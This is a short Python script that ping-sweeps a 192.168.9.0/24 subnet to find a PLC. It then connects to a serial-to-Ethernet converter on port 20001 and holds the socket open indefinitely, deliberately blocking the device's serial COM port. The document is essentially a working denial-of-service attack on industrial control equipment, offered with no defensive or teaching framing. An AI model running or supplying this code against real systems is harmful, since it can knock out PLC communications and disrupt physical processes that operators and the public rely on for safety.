import socket
import subprocess
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    # and the subnet is 192.168.9.0/24
    subnet = "192.168.9."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        response = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True, text=True)
        if "Reply from" in response.stdout:
            print(f"PLC found at IP: {ip}")
            return ip
    print("PLC not found on the network.")
    return None

# Function to block the serial COM port
def block_serial_com(plc_ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)  # Set a timeout for the connection attempt

        # Connect to the serial to Ethernet converter
        sock.connect((plc_ip, port))
        print(f"Connection established to {plc_ip}:{port}")

        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Connection closed by user.")
    finally:
        sock.close()

if __name__ == "__main__":
    # Find the PLC IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        # Block the serial COM port (assuming port 20001 for COM1)
        block_serial_com(plc_ip, 20001)